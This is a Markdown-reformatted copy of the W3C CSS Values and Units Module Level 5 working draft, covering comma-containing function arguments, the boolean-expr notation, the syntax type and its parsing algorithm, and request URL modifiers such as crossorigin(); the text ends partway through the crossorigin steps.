Attribution and reformatting notice added for Surgeist on 2026-10-03

This reformatted document accompanies Surgeist as software implementation support. The original English document at the source URL remains authoritative; this copy is not a new technical specification. Added labels and representation notes are non-normative. W3C is not responsible for content absent from the original, and this copy may contain formatting or hypertext errors.

This software or document includes material copied from or derived from [CSS Values and Units Module Level 5](https://www.w3.org/TR/2024/WD-css-values-5-20241111/).

Original copyright notice: Copyright © 2024 World Wide Web Consortium. W3C® liability, trademark and permissive document license rules apply.

License: [W3C Software and Document License, 2023 version](../licenses/w3c/software-license-2023.txt). Changes are format conversion, visible semantic labels, local exact-snapshot links, and passive SVG/TeX representations as detailed in the [conversion report](CONVERSION-REPORT.md). Original source text, status, authorship, and legal notices remain below.

# Source provenance

Title: CSS Values and Units Module Level 5

Source snapshot: https://www.w3.org/TR/2024/WD-css-values-5-20241111/

Snapshot SHA-256: af984ef26b3954143b0f270253e3373f06b5255a5ac00aad919a4cb1b334a8ad

Conversion: offline format conversion of the exact stored HTML; not a new specification or summary. Publication versions remain distinct. Source fragment identifiers are preserved as short HTML anchors. Original copyright and licensing text/links are retained where present in the source.

Representation notes:
- The 2 source tables are presented as readable Markdown tables or explicit labeled layouts: 2 ordinary table conversions. Source cell content, links and relationships are retained.
- Added table headings and layout labels are non-normative presentation aids. Source header/data roles and span models remain in the conversion checks; GFM cannot reproduce native HTML th/scope/rowspan/colspan accessibility semantics. Source row-header labels are bold where used in ordinary Markdown tables.
- Small semantic emphasis/subscript/superscript HTML is retained to avoid GFM intraword-delimiter and subscript rendering defects; website layout HTML is not retained.
- Canonically unstable or combining Unicode characters and escape-sensitive punctuation are shielded as numeric entities in prose/semantic inline HTML. Literal source code stays literal.
- Existing external image/media URLs are resolved against the pinned source. Assets are not downloaded or availability-tested; image-only formulas/diagrams still require their source resources.

---

# <a id="title"></a>CSS Values and Units Module Level 5

[Copyright](https://www.w3.org/policies/#copyright) © 2024 [World Wide Web Consortium](https://www.w3.org/). W3C<sup>®</sup> [liability](https://www.w3.org/policies/#Legal_Disclaimer), [trademark](https://www.w3.org/policies/#W3C_Trademarks) and [permissive document license](https://www.w3.org/copyright/software-license/) rules apply.

## <a id="abstract"></a>Abstract

This CSS module describes the common values and units that CSS properties accept and the syntax used for describing them in CSS property definitions.

[CSS](https://www.w3.org/TR/CSS/) is a language for describing the rendering of structured documents (such as HTML and XML) on screen, on paper, etc.

## <a id="sotd"></a>Status of this document

<em>This section describes the status of this document at the time of its publication.
	A list of current W3C publications
	and the latest revision of this technical report
	can be found in the <a href="https://www.w3.org/TR/">W3C technical reports index at https&#58;//www&#46;w3&#46;org/TR/.</a></em>

This document was published by the [CSS Working Group](https://www.w3.org/groups/wg/css) as a <strong>Working Draft</strong> using the [Recommendation track](https://www.w3.org/policies/process/20231103/#recs-and-notes). Publication as a Working Draft does not imply endorsement by W3C and its Members.

This is a draft document and may be updated, replaced or obsoleted by other documents at any time. It is inappropriate to cite this document as other than work in progress.

Please send feedback by [filing issues in GitHub](https://github.com/w3c/csswg-drafts/issues) (preferred), including the spec code “css-values” in the title, like this: “\[css-values\] <i>…summary of comment…</i>”. All issues and comments are [archived](https://lists.w3.org/Archives/Public/public-css-archive/). Alternately, feedback can be sent to the ([archived](https://lists.w3.org/Archives/Public/www-style/)) public mailing list [www-style@w3.org](mailto:www-style@w3.org?Subject=%5Bcss-values%5D%20PUT%20SUBJECT%20HERE).

<a id="w3c_process_revision"></a>

This document is governed by the [03 November 2023 W3C Process Document](https://www.w3.org/policies/process/20231103/).

This document was produced by a group operating under the [W3C Patent Policy](https://www.w3.org/policies/patent-policy/20200915/). W3C maintains a [public list of any patent disclosures](https://www.w3.org/groups/wg/css/ipr) made in connection with the deliverables of the group; that page also includes instructions for disclosing a patent. An individual who has actual knowledge of a patent which the individual believes contains [Essential Claim(s)](https://www.w3.org/policies/patent-policy/20200915/#def-essential) must disclose the information in accordance with [section 6 of the W3C Patent Policy](https://www.w3.org/policies/patent-policy/20200915/#sec-Disclosure).

<strong>This spec is in the early exploration phase. Feedback is welcome, and and major breaking changes are expected.</strong>

## <a id="intro"></a>1.  Introduction

> <strong data-conversion-semantic="issue">Issue</strong>
>
> <a id="issue-39df5f37"></a> <strong>This is a diff spec against <a href="https://www.w3.org/TR/css-values-4/">CSS Values and Units Level 4</a>.</strong>

### <a id="placement"></a>1.1.  Module Interactions

This module extends [\[CSS-VALUES-4\]](#biblio-css-values-4) which replaces and extends the data type definitions in [\[CSS21\]](#biblio-css21) sections [1.4.2.1](https://www.w3.org/TR/CSS21/about.html#value-defs), [4.3](https://www.w3.org/TR/CSS21/syndata.html#values), and [A.2](https://www.w3.org/TR/CSS21/aural.html#aural-intro).

## <a id="textual-values"></a>2.  Textual Data Types

See [CSS Values 4 § 4 Textual Data Types](https://www.w3.org/TR/css-values-4/#textual-values).

## <a id="value-defs"></a>3.  Value Definition Syntax

See [CSS Values 4 § 2 Value Definition Syntax](https://www.w3.org/TR/css-values-4/#value-defs).

Additionally,

1.  <a id="ref-for-media-query"></a>

    <a id="ref-for-typedef-boolean-expr"></a>

    Boolean combinations of a conditional notation. These are written using the [\<boolean-expr\[\]\>](#typedef-boolean-expr) notation, and represent recursive expressions of boolean logic using keywords and parentheses, applied to the grammar specified in brackets, e.g. \<boolean-expr\[ ( &#x26;lt;media-feature&#x26;gt; ) \]\> to express [media queries](https://www.w3.org/TR/mediaqueries-5/#media-query).

### <a id="component-functions"></a>3.1.  Functional Notation Definitions

See [CSS Values 4 § 2.6 Functional Notation Definitions](https://www.w3.org/TR/css-values-4/#component-functions).

#### <a id="component-function-commas"></a>3.1.1.  Commas in Function Arguments

<a id="ref-for-functional-notation"></a>

<a id="ref-for-funcdef-mix"></a>

<a id="ref-for-whole-value"></a>

<a id="ref-for-typedef-declaration-value"></a>

<a id="ref-for-typedef-any-value"></a>

[Functional notation](https://www.w3.org/TR/css-values-4/#functional-notation) often uses commas to separate parts of its internal grammar. However, some functions (such as [mix()](#funcdef-mix)) allow values that, themselves, can contain commas. These values (currently [\<whole-value\>](#whole-value), [\<declaration-value\>](https://www.w3.org/TR/css-syntax-3/#typedef-declaration-value), and [\<any-value\>](https://www.w3.org/TR/css-syntax-3/#typedef-any-value)) are <a id="comma-containing-productions"></a>comma-containing productions.

<a id="ref-for-comma-containing-productions"></a>

To accommodate these sorts of grammars unambiguously, the [comma-containing productions](#comma-containing-productions) can be optionally wrapped in curly braces {}. These braces are syntactic, not part of the actual value. Specifically:

- <a id="ref-for-comma-containing-productions①"></a>

  A [comma-containing production](#comma-containing-productions) can either start with a "{" token, or not.

- If it does not start with a "{" token, then it cannot contain commas or {} blocks, in addition to whatever specific restrictions it defines for itself. (The production stops parsing at that point, so the comma or {} block is matched by the next grammar term instead; probably the function’s own argument-separating comma.)

- If it does start with a "{" token, then the production matches just the {} block that the "{" token opens. It represents the <em>contents</em> of that block, and applies whatever specific restrictions it defines for itself to those contents, ignoring the {} block wrapper.

<a id="ref-for-funcdef-random-item"></a>

> <strong data-conversion-semantic="example">Example</strong>
>
> <a id="example-3c1508a5"></a> For example, the grammar of the [random-item()](#funcdef-random-item) function is:
>
> <a id="ref-for-typedef-random-caching-options"></a>
>
> <a id="ref-for-typedef-declaration-value①"></a>
>
> ```text
> random-item( <random-caching-options>, [<declaration-value>?]# )
> ```
>
> The \# indicates comma-separated repetitions, so randomly choosing between three keywords would be written as normal for functions, like:
>
> ```text
> font-family: random-item(--x, serif, sans-serif, monospace);
> ```
>
> However, sometimes the values you want to choose between need to include commas. When this is the case, wrapping the values in {} allows their commas to be distinguished from the function’s argument-separating commas:
>
> ```text
> font-family: random-item(--x, {Times, serif}, {Arial, sans-serif}, {Courier, monospace});
> ```
>
> This randomly chooses one of three font-family lists: either Times, serif, or Arial, sans-serif, or Courier, monospace.
>
> This is not all-or-nothing; you can use {} around <em>some</em> arguments that need it, while leaving others bare when they don’t need it. You are also allowed to use {} around a value when it’s not strictly required. For example:
>
> ```text
> font-family: random-item(--x, {Times, serif}, sans-serif, {monospace});
> ```
>
> <a id="ref-for-valdef-font-family-sans-serif"></a>
>
> <a id="ref-for-valdef-font-family-monospace"></a>
>
> This represents choosing between three font-family lists: either Times, serif, or [sans-serif](https://www.w3.org/TR/css-fonts-4/#valdef-font-family-sans-serif), or [monospace](https://www.w3.org/TR/css-fonts-4/#valdef-font-family-monospace).
>
> <a id="ref-for-comma-containing-productions②"></a>
>
> However, this {}-wrapping is <em>only</em> allowed for some function arguments—​those defined as [comma-containing productions](#comma-containing-productions). It’s not valid for any other productions; if you use {} around other function arguments, it’ll just fail to match the function’s grammar and become invalid. For example, the following is <strong>invalid</strong>:
>
> ```text
> background-image: linear-gradient(to left, {red}, magenta);
> ```
<a id="ref-for-arbitrary-substitution-function"></a>

<a id="ref-for-funcdef-var"></a>

<a id="ref-for-propdef-font-family"></a>

> <strong data-conversion-semantic="note">Note</strong>
>
> Note: Because {} wrappers are allowed even when not explicitly required, they can be used defensively around values when the author isn’t sure if they’ll end up containing commas or not, due to [arbitrary substitution functions](#arbitrary-substitution-function) like [var()](https://www.w3.org/TR/css-variables-1/#funcdef-var). For example, [font-family: random-item(--x, {var(--list1)}, monospace)](https://www.w3.org/TR/css-fonts-4/#propdef-font-family) will work correctly regardless of whether the --list1 custom property contains a comma-separated list or not.

<a id="ref-for-functional-notation①"></a>

[Functional notations](https://www.w3.org/TR/css-values-4/#functional-notation) are serialized without {} wrappers whenever possible.

<a id="ref-for-comma-containing-productions③"></a>

The following generic productions are [comma-containing productions](#comma-containing-productions):

- <a id="ref-for-typedef-any-value①"></a>

  [\<any-value\>](https://www.w3.org/TR/css-syntax-3/#typedef-any-value)

- <a id="ref-for-whole-value①"></a>

  [\<whole-value\>](#whole-value)

- <a id="ref-for-typedef-declaration-value②"></a>

  [\<declaration-value\>](https://www.w3.org/TR/css-syntax-3/#typedef-declaration-value)

<a id="ref-for-typedef-declaration-value③"></a>

<a id="ref-for-funcdef-var①"></a>

<a id="ref-for-comma-containing-productions④"></a>

For legacy compat reasons, the [\<declaration-value\>](https://www.w3.org/TR/css-syntax-3/#typedef-declaration-value) defined the fallback value for [var()](https://www.w3.org/TR/css-variables-1/#funcdef-var) is a <a id="non-strict-comma-containing-production"></a>non-strict comma-containing production. It ignores the rules restricting what it can contain when it does not start with a "{" token: it is allowed to contain commas and {} blocks. It still follows the standard [comma-containing production](#comma-containing-productions) rules when it <em>does</em> start with a "{" token, however: the fallback is just the contents of the {} block, and doesn’t include the {} wrapper itself.

<a id="ref-for-non-strict-comma-containing-production"></a>

Other contexts <em>may</em> define that they use [non-strict comma-containing productions](#non-strict-comma-containing-production), but it <em>should</em> be avoided unless necessary.

<a id="ref-for-typedef-boolean-expr①"></a>

### <a id="boolean"></a>3.2.  Boolean Expression Multiplier [\<boolean-expr\[\]\>](#typedef-boolean-expr)

<a id="ref-for-at-ruledef-media"></a>

<a id="ref-for-at-ruledef-supports"></a>

<a id="ref-for-funcdef-if"></a>

<a id="ref-for-typedef-boolean-expr②"></a>

Several contexts (such as [@media](https://www.w3.org/TR/css-conditional-3/#at-ruledef-media), [@supports](https://www.w3.org/TR/css-conditional-3/#at-ruledef-supports), [if()](#funcdef-if), ...) specify conditions, and allow combining those conditions with boolean logic (and/or/not/grouping). Because they use the same non-trivial recursive syntax structure, the special <a id="typedef-boolean-expr"></a>[\<boolean-expr\[\]\>](#typedef-boolean-expr) production represents this pattern generically.

<a id="ref-for-typedef-boolean-expr③"></a>

<a id="ref-for-valdef-media-not"></a>

The [\<boolean-expr\[\]\>](#typedef-boolean-expr) notation wraps another value type in the square brackets within it, e.g. \<boolean\[ \<test\> \]\>, and represents that value type alone as well as boolean combinations using the [not](https://www.w3.org/TR/mediaqueries-5/#valdef-media-not), and, and or keywords and grouping parenthesis. It is formally equivalent to:

<a id="ref-for-comb-one"></a>

<a id="ref-for-mult-zero-plus"></a>

<a id="ref-for-comb-one①"></a>

<a id="ref-for-mult-zero-plus①"></a>

<a id="ref-for-comb-one②"></a>

<a id="ref-for-comb-one③"></a>

```text
<boolean-expr[ <test> ]> = not <boolean-expr-group> | <boolean-expr-group>
                                            [ [ and <boolean-expr-group> ]*
                                            | [ or <boolean-expr-group> ]* ]

<boolean-expr-group> = <test> | ( <boolean-expr[ <test> ]> ) | <general-enclosed>
```
<a id="ref-for-typedef-boolean-expr④"></a>

The [\<boolean-expr\[\]\>](#typedef-boolean-expr) production represents a true, false, or unknown value. Its value is resolved using 3-value Kleene logic, with top-level unknown values (those not directly nested inside the grammar of another <a id="ref-for-typedef-boolean-expr⑤"></a>\<boolean-expr\[\]\>) resolving to false unless otherwise specified; see [Appendix B: Boolean Logic](#boolean-logic) for details.

<a id="ref-for-at-ruledef-container"></a>

<a id="ref-for-typedef-boolean-expr⑥"></a>

> <strong data-conversion-semantic="example">Example</strong>
>
> <a id="example-431f6d8a"></a> For example, the [@container](https://www.w3.org/TR/css-conditional-5/#at-ruledef-container) rule allows a wide variety of tests: including size queries, style queries, and scroll-state queries. All of these are arbitrarily combinable with boolean logic. Using [\<boolean-expr\[\]\>](#typedef-boolean-expr), the grammar for an <a id="ref-for-at-ruledef-container①"></a>@container query could be written as:
>
> <a id="ref-for-comb-one④"></a>
>
> <a id="ref-for-comb-one⑤"></a>
>
> <a id="ref-for-comb-one⑥"></a>
>
> <a id="ref-for-comb-one⑦"></a>
>
> <a id="ref-for-comb-one⑧"></a>
>
> ```text
> <container-query> = <boolean-expr[ <cq-test> ]>
> <cq-test> = (<size-query>) | style( <style-query> ) | scroll-state( <scroll-state-query> )
> <size-query> = <boolean-expr[ ( <size-feature> ) ]> | <size-feature>
> <style-query> = <boolean-expr[ ( <style-feature> ) ]> | <style-feature>
> <scroll-state-query> = <boolean-expr[ ( <scroll-state-feature> ) ]> | <scroll-state-feature>
> ```
<a id="ref-for-typedef-general-enclosed"></a>

<a id="ref-for-typedef-boolean-expr⑦"></a>

The [\<general-enclosed\>](https://www.w3.org/TR/mediaqueries-5/#typedef-general-enclosed) branch of the logic allows for future compatibility—​unless otherwise specified new expressions in an older UA will be parsed and considered “unknown”, rather than invalidating the production. For consistency with that allowance, the \<test\> term in a [\<boolean-expr\[\]\>](#typedef-boolean-expr) should be defined to match <a id="ref-for-typedef-general-enclosed①"></a>\<general-enclosed\>.

<a id="ref-for-typedef-syntax"></a>

### <a id="css-syntax"></a>3.3.  Specifying CSS Syntax in CSS: the [\<syntax\>](#typedef-syntax) type

<a id="ref-for-funcdef-attr"></a>

<a id="ref-for-registered-custom-property"></a>

<a id="ref-for-typedef-syntax①"></a>

<a id="ref-for-css-value-definition-syntax"></a>

<a id="ref-for-syntax-definition"></a>

Some features in CSS, such as the [attr()](#funcdef-attr) function or [registered custom properties](https://www.w3.org/TR/css-properties-values-api-1/#registered-custom-property), allow you to specify how <em>another</em> value is meant to be parsed. This is declared via the [\<syntax\>](#typedef-syntax) production, which resembles a limited form of the CSS [value definition syntax](https://www.w3.org/TR/css-values-4/#css-value-definition-syntax) used in specifications to define CSS features, and which represents a [syntax definition](https://www.w3.org/TR/css-properties-values-api-1/#syntax-definition):

<a id="typedef-syntax"></a>

<a id="ref-for-typedef-syntax②"></a>

<a id="ref-for-comb-one⑨"></a>

<a id="ref-for-typedef-syntax-component"></a>

<a id="ref-for-typedef-syntax-combinator"></a>

<a id="ref-for-typedef-syntax-component①"></a>

<a id="ref-for-mult-zero-plus②"></a>

<a id="ref-for-comb-one①⓪"></a>

<a id="ref-for-typedef-syntax-string"></a>

<a id="typedef-syntax-component"></a>

<a id="ref-for-typedef-syntax-component②"></a>

<a id="ref-for-typedef-syntax-single-component"></a>

<a id="ref-for-typedef-syntax-multiplier"></a>

<a id="ref-for-mult-opt"></a>

<a id="ref-for-comb-one①①"></a>

<a id="typedef-syntax-single-component"></a>

<a id="ref-for-typedef-syntax-single-component①"></a>

<a id="ref-for-typedef-syntax-type-name"></a>

<a id="ref-for-comb-one①②"></a>

<a id="ref-for-typedef-ident"></a>

<a id="typedef-syntax-type-name"></a>

<a id="ref-for-typedef-syntax-type-name①"></a>

<a id="ref-for-comb-one①③"></a>

<a id="ref-for-comb-one①④"></a>

<a id="ref-for-comb-one①⑤"></a>

<a id="ref-for-comb-one①⑥"></a>

<a id="ref-for-comb-one①⑦"></a>

<a id="ref-for-comb-one①⑧"></a>

<a id="ref-for-comb-one①⑨"></a>

<a id="ref-for-comb-one②⓪"></a>

<a id="ref-for-comb-one②①"></a>

<a id="ref-for-comb-one②②"></a>

<a id="ref-for-comb-one②③"></a>

<a id="ref-for-comb-one②④"></a>

<a id="ref-for-comb-one②⑤"></a>

<a id="typedef-syntax-combinator"></a>

<a id="ref-for-typedef-syntax-combinator①"></a>

<a id="typedef-syntax-multiplier"></a>

<a id="ref-for-typedef-syntax-multiplier①"></a>

<a id="ref-for-comb-one②⑥"></a>

<a id="typedef-syntax-string"></a>

<a id="ref-for-typedef-syntax-string①"></a>

<a id="ref-for-string-value"></a>

```text
<syntax> = '*' | <syntax-component> [ <syntax-combinator> <syntax-component> ]* | <syntax-string>
<syntax-component> = <syntax-single-component> <syntax-multiplier>?
                   | '<' transform-list '>'
<syntax-single-component> = '<' <syntax-type-name> '>' | <ident>
<syntax-type-name> = angle | color | custom-ident | image | integer
                   | length | length-percentage | number
                   | percentage | resolution | string | time
                   | url | transform-function
<syntax-combinator> = '|'
<syntax-multiplier> = [ '#' | '+' ]

<syntax-string> = <string>
```
<a id="ref-for-typedef-syntax-component③"></a>

<a id="ref-for-typedef-syntax-type-name②"></a>

<a id="ref-for-css-supported-syntax-component-name"></a>

<a id="ref-for-typedef-ident①"></a>

<a id="ref-for-css-keyword"></a>

<a id="ref-for-list"></a>

A [\<syntax-component\>](#typedef-syntax-component) consists of either a [\<syntax-type-name\>](#typedef-syntax-type-name) between \<\> (angle brackets), which maps to one of the [supported syntax component names](https://www.w3.org/TR/css-properties-values-api-1/#css-supported-syntax-component-name), or an [\<ident\>](https://www.w3.org/TR/css-values-4/#typedef-ident), which represents any [keyword](https://www.w3.org/TR/css-values-4/#css-keyword). Additionally, a <a id="ref-for-typedef-syntax-component④"></a>\<syntax-component\> may contain a [multiplier](https://www.w3.org/TR/css-properties-values-api-1/#multipliers), which indicates a [list](https://infra.spec.whatwg.org/#list) of values.

<a id="ref-for-length-value"></a>

<a id="ref-for-css-keyword①"></a>

> <strong data-conversion-semantic="note">Note</strong>
>
> Note: This means that `<length>` and `length` are two different types: the former describes a [\<length\>](https://www.w3.org/TR/css-values-4/#length-value), whereas the latter describes a [keyword](https://www.w3.org/TR/css-values-4/#css-keyword) `length`.

<a id="ref-for-typedef-syntax-component⑤"></a>

<a id="ref-for-typedef-delim-token"></a>

Multiple [\<syntax-component\>](#typedef-syntax-component)s may be [combined](https://www.w3.org/TR/css-properties-values-api-1/#combinator) with a `|` [\<delim-token\>](https://www.w3.org/TR/css-syntax-3/#typedef-delim-token), causing the syntax components to be matched against a value in the specified order.

> <strong data-conversion-semantic="example">Example</strong>
>
> <a id="example-2dceeea6"></a>
>
> ```css
> <percentage> | <number> | auto
> ```
>
> <a id="ref-for-typedef-syntax③"></a>
>
> <a id="ref-for-percentage-value"></a>
>
> <a id="ref-for-number-value"></a>
>
> The above, when parsed as a [\<syntax\>](#typedef-syntax), would accept [\<percentage\>](https://www.w3.org/TR/css-values-4/#percentage-value) values, [\<number\>](https://www.w3.org/TR/css-values-4/#number-value) values, as well as the keyword `auto`.

> <strong data-conversion-semantic="example">Example</strong>
>
> <a id="example-a723371b"></a>
>
> ```css
> red | <color>
> ```
>
> <a id="ref-for-syntax-definition①"></a>
>
> <a id="ref-for-typedef-syntax④"></a>
>
> <a id="ref-for-css-parse-something-according-to-a-css-grammar"></a>
>
> <a id="ref-for-css-css-identifier"></a>
>
> <a id="ref-for-typedef-color"></a>
>
> The [syntax definition](https://www.w3.org/TR/css-properties-values-api-1/#syntax-definition) resulting from the above [\<syntax\>](#typedef-syntax), when used as a grammar for [parsing](https://www.w3.org/TR/css-syntax-3/#css-parse-something-according-to-a-css-grammar), would match an input `red` as an [identifier](https://www.w3.org/TR/css-values-4/#css-css-identifier), but would match an input `blue` as a [\<color\>](https://www.w3.org/TR/css-color-5/#typedef-color).

<a id="ref-for-typedef-delim-token①"></a>

<a id="ref-for-universal-syntax-definition"></a>

The `*` [\<delim-token\>](https://www.w3.org/TR/css-syntax-3/#typedef-delim-token) represents the [universal syntax definition](https://www.w3.org/TR/css-properties-values-api-1/#universal-syntax-definition).

<a id="ref-for-typedef-syntax-multiplier②"></a>

The `<transform-list>` production is a convenience form equivalent to `<transform-function>+`. <strong data-conversion-semantic="note">Note:</strong> Note that `<transform-list>` may not be followed by a [\<syntax-multiplier\>](#typedef-syntax-multiplier).

<a id="ref-for-whitespace"></a>

<a id="ref-for-typedef-delim-token②"></a>

<a id="ref-for-typedef-syntax-type-name③"></a>

<a id="ref-for-typedef-syntax-multiplier③"></a>

[Whitespace](https://www.w3.org/TR/css-syntax-3/#whitespace) is not allowed between the angle bracket [\<delim-token\>](https://www.w3.org/TR/css-syntax-3/#typedef-delim-token)s (`<` `>`) and the [\<syntax-type-name\>](#typedef-syntax-type-name) they enclose, nor is <a id="ref-for-whitespace①"></a>whitespace allowed to precede a [\<syntax-multiplier\>](#typedef-syntax-multiplier).

<a id="ref-for-whitespace②"></a>

> <strong data-conversion-semantic="note">Note</strong>
>
> Note: The [whitespace](https://www.w3.org/TR/css-syntax-3/#whitespace) restrictions also apply to `<transform-list>`.

<a id="ref-for-typedef-syntax-string②"></a>

<a id="ref-for-string-value①"></a>

<a id="ref-for-css-parse-something-according-to-a-css-grammar①"></a>

<a id="ref-for-typedef-syntax⑤"></a>

A [\<syntax-string\>](#typedef-syntax-string) is a [\<string\>](https://www.w3.org/TR/css-values-4/#string-value) whose value successfully [parses](https://www.w3.org/TR/css-syntax-3/#css-parse-something-according-to-a-css-grammar) as a [\<syntax\>](#typedef-syntax), and represents the same value as that <a id="ref-for-typedef-syntax⑥"></a>\<syntax\> would.

<a id="ref-for-typedef-syntax-string③"></a>

<a id="ref-for-typedef-syntax⑦"></a>

<a id="ref-for-at-ruledef-property"></a>

<a id="ref-for-string-value②"></a>

> <strong data-conversion-semantic="note">Note</strong>
>
> Note: [\<syntax-string\>](#typedef-syntax-string) mostly exists for historical purposes; before [\<syntax\>](#typedef-syntax) was defined, the [@property](https://www.w3.org/TR/css-properties-values-api-1/#at-ruledef-property) rule used a [\<string\>](https://www.w3.org/TR/css-values-4/#string-value) for this purpose.

<a id="ref-for-typedef-syntax⑧"></a>

#### <a id="parse-syntax"></a>3.3.1.  Parsing as [\<syntax\>](#typedef-syntax)

<a id="ref-for-typedef-syntax⑨"></a>

<a id="ref-for-registered-custom-property①"></a>

<a id="ref-for-funcdef-attr①"></a>

<a id="ref-for-css-parse-something-according-to-a-css-grammar②"></a>

The purpose of a [\<syntax\>](#typedef-syntax) is usually to specify how to parse another value (such as the value of a [registered custom property](https://www.w3.org/TR/css-properties-values-api-1/#registered-custom-property), or an attribute value in [attr()](#funcdef-attr)). However, the generic [parse something according to a CSS grammar](https://www.w3.org/TR/css-syntax-3/#css-parse-something-according-to-a-css-grammar) algorithm returns an unspecified internal structure, since parse results might be ambiguous and need further massaging.

<a id="ref-for-parse-with-a-syntax"></a>

To avoid these issues and get a well-defined result, use [parse with a \<syntax\>](#parse-with-a-syntax):

<a id="ref-for-typedef-syntax①⓪"></a>

<a id="ref-for-string"></a>

<a id="ref-for-list①"></a>

<a id="ref-for-component-value"></a>

<a id="ref-for-typedef-syntax①①"></a>

<a id="ref-for-guaranteed-invalid-value"></a>

To <a id="parse-with-a-syntax"></a>parse with a [\<syntax\>](#typedef-syntax) given a [string](https://infra.spec.whatwg.org/#string) or [list](https://infra.spec.whatwg.org/#list) or [component values](https://www.w3.org/TR/css-syntax-3/#component-value) <var>values</var>, a [\<syntax\>](#typedef-syntax) value <var>syntax</var>, and optionally an element <var>el</var> for context, perform the following steps. It returns either CSS values, or the [guaranteed-invalid value](https://www.w3.org/TR/css-variables-1/#guaranteed-invalid-value).

1.  <a id="ref-for-parse-a-list-of-component-values"></a>

    [Parse a list of component values](https://www.w3.org/TR/css-syntax-3/#parse-a-list-of-component-values) from <var>values</var>, and let <var>raw parse</var> be the result.

2.  <a id="ref-for-substitute-arbitrary-substitution-function"></a>

    If <var>el</var> was given, [substitute arbitrary substitution functions](#substitute-arbitrary-substitution-function) in <var>raw parse</var>, and set <var>raw parse</var> to that result.

3.  <a id="ref-for-css-parse-something-according-to-a-css-grammar③"></a>

    <a id="ref-for-x"></a>

    <a id="ref-for-typedef-declaration-value④"></a>

    [parse](https://www.w3.org/TR/css-syntax-3/#css-parse-something-according-to-a-css-grammar) <var>values</var> according to <var>syntax</var>, with a [\*](https://www.w3.org/TR/selectors-3/#x) value treated as <code><a href="https://www.w3.org/TR/css-syntax-3/#typedef-declaration-value">&lt;declaration-value&gt;</a>?</code>, and let <var>parsed result</var> be the result. If <var>syntax</var> used a \| combinator, let <var>parsed result</var> be the parse result from the first matching clause.

4.  <a id="ref-for-guaranteed-invalid-value①"></a>

    If <var>parsed result</var> is failure, return the [guaranteed-invalid value](https://www.w3.org/TR/css-variables-1/#guaranteed-invalid-value).

5.  <a id="ref-for-typedef-syntax①②"></a>

    <a id="ref-for-x①"></a>

    Assert: <var>parsed result</var> is now a well-defined list of one or more CSS values, since each branch of a [\<syntax\>](#typedef-syntax) defines an unambiguous parse result (or the [\*](https://www.w3.org/TR/selectors-3/#x) syntax is unambiguous on its own).

6.  Return <var>parsed result</var>.

<a id="ref-for-computed-value"></a>

> <strong data-conversion-semantic="note">Note</strong>
>
> Note: This algorithm does not resolved the parsed values into [computed values](https://www.w3.org/TR/css-cascade-5/#computed-value); the context in which the value is used will usually do that already, but if not, the invoking algorithm will need to handle that on its own.

## <a id="level-4-extensions"></a>4.  Extensions to Level 4 Value Types

See [CSS Values and Units Level 4](https://www.w3.org/TR/css-values-4/).

<a id="ref-for-url-value"></a>

### <a id="urls"></a>4.1.  Resource Locators: the [\<url\>](https://www.w3.org/TR/css-values-4/#url-value) type

See [CSS Values 4 § 4.5 Resource Locators: the \<url\> type](https://www.w3.org/TR/css-values-4/#urls).

#### <a id="request-url-modifiers"></a>4.1.1.  Request URL Modifiers

<a id="ref-for-typedef-request-url-modifier"></a>

<a id="ref-for-typedef-url-modifier"></a>

<a id="ref-for-url-value①"></a>

<a id="ref-for-concept-request"></a>

<a id="ref-for-url-request-modifier-steps"></a>

<a id="typedef-request-url-modifier"></a>[\<request-url-modifier\>](#typedef-request-url-modifier)s are [\<url-modifier\>](https://www.w3.org/TR/css-values-4/#typedef-url-modifier)s that affect the [\<url\>](https://www.w3.org/TR/css-values-4/#url-value)’s resource [request](https://fetch.spec.whatwg.org/#concept-request) by applying associated [URL request modifier steps](https://www.w3.org/TR/css-values-4/#url-request-modifier-steps). See [CSS Values 4 § 4.5.4 URL Processing Model](https://www.w3.org/TR/css-values-4/#url-processing).

<a id="ref-for-typedef-request-url-modifier①"></a>

This specification defines the following [\<request-url-modifier\>](#typedef-request-url-modifier)s:

<a id="ref-for-typedef-request-url-modifier②"></a>

<a id="ref-for-typedef-request-url-modifier-crossorigin-modifier"></a>

<a id="ref-for-comb-one②⑦"></a>

<a id="ref-for-typedef-request-url-modifier-integrity-modifier"></a>

<a id="ref-for-comb-one②⑧"></a>

<a id="ref-for-typedef-request-url-modifier-referrerpolicy-modifier"></a>

<a id="ref-for-typedef-request-url-modifier-crossorigin-modifier①"></a>

<a id="ref-for-comb-one②⑨"></a>

<a id="ref-for-typedef-request-url-modifier-integrity-modifier①"></a>

<a id="ref-for-string-value③"></a>

<a id="ref-for-typedef-request-url-modifier-referrerpolicy-modifier①"></a>

<a id="ref-for-comb-one③⓪"></a>

<a id="ref-for-comb-one③①"></a>

<a id="ref-for-comb-one③②"></a>

<a id="ref-for-comb-one③③"></a>

<a id="ref-for-comb-one③④"></a>

<a id="ref-for-comb-one③⑤"></a>

<a id="ref-for-comb-one③⑥"></a>

```text
<request-url-modifier> = <crossorigin-modifier> | <integrity-modifier> | <referrerpolicy-modifier>
<crossorigin-modifier> = crossorigin(anonymous | use-credentials)
<integrity-modifier> = integrity(<string>)
<referrerpolicy-modifier> = referrerpolicy(no-referrer | no-referrer-when-downgrade | same-origin | origin | strict-origin | origin-when-cross-origin | strict-origin-when-cross-origin | unsafe-url)
```
<a id="ref-for-typedef-request-url-modifier-crossorigin-modifier②"></a>

<a id="typedef-request-url-modifier-crossorigin-modifier"></a>[\<crossorigin-modifier\>](#typedef-request-url-modifier-crossorigin-modifier) = <a id="funcdef-request-url-modifier-crossorigin"></a>crossorigin(<a id="valdef-request-url-modifier-anonymous"></a>anonymous \| <a id="valdef-request-url-modifier-use-credentials"></a>use-credentials)

<a id="ref-for-concept-request①"></a>

<a id="ref-for-url-request-modifier-steps①"></a>

The [URL request modifier steps](https://www.w3.org/TR/css-values-4/#url-request-modifier-steps) for this modifier given [request](https://fetch.spec.whatwg.org/#concept-request) <var>req</var> are:

1.  <a id="ref-for-concept-request②"></a>

    <a id="ref-for-concept-request-mode"></a>

    Set [request](https://fetch.spec.whatwg.org/#concept-request)'s [mode](https://fetch.spec.whatwg.org/#concept-request-mode) to "cors".

2.  <a id="ref-for-valdef-request-url-modifier-use-credentials"></a>

    <a id="ref-for-concept-request③"></a>

    <a id="ref-for-concept-request-credentials-mode"></a>

    If the given value is [use-credentials](#valdef-request-url-modifier-use-credentials), set [request](https://fetch.spec.whatwg.org/#concept-request)'s [credentials mode](https://fetch.spec.whatwg.org/#concept-request-credentials-mode) to "include".

<a id="ref-for-string-value④"></a>

